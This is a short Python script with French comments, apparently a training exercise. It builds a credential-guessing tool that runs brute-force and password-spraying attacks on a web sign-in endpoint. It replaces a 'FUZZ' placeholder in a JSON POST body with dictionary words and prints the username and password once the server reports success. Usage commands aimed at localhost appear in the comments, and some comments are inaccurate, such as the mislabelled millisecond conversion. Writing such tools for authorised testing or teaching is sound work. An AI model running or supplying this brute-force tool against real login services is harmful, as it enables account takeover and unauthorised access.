import argparse
import asyncio
import httpx
import time
import json 

# Développez un outil de fuzzing.
# voilà comment utiliser l'outil:

# Pour réaliser une attaque de brute force :
# $ py h4cktools.py -u '""http://127.0.0.1:8000/signin/""' -d passwords.txt -p '{ ""username"": ""Coco"", ""password"": ""FUZZ"" }'

# Pour réaliser une attaque de password spraying :
# $ h4cktool -u http://127.0.0.1:8000/signin -d users.txt -p '{ "username": "FUZZ", "password": "password" }'

# L'objectif est de remplacer "FUZZ" par les mots du dictionnaire et d'envoyer le résultat dans le body
# d'une requête POST envoyée à l'URL

# -u, --url
# -d, --dict
# -p, --post

def argument():
    parser = argparse.ArgumentParser(description="Script de copie de fichiers")

    parser.add_argument("-u", "--url", help="url path", required=True)
    parser.add_argument("-d", "--dict", help="path to dictionary file", required=True)
    parser.add_argument("-p", "--post", help="data", required=True)
    parser.add_argument("-r", "--rate", type = int, help="delay between try in millisecond", required=True)
    parser.add_argument("-h2", "--help2", action="store_true", help="view all possible command")

    args = parser.parse_args()
    return args.dict, args.url, args.post, args.rate

async def main(url, dic_data):
    async with httpx.AsyncClient() as client:
        resp = await client.post(url, json=dic_data)
        return resp.json()
        


if __name__ == "__main__":
    dico, url, data, rate=argument()
    rate /= 1000 #transform rate from sec to milliseconds
    dic_data = json.loads(data)
    
    if dic_data["username"] == "FUZZ":
        choice = "username"
    else:
        choice = "password"
    
    with open(dico) as f:
        for line in f:
            passwd = line.strip()
            dic_data.update({choice: passwd})
            response = asyncio.run(main(url, dic_data))
            if response['Success']:
                print("username:", dic_data['username'], "password:", dic_data['password'])
                break
            time.sleep(rate)
            



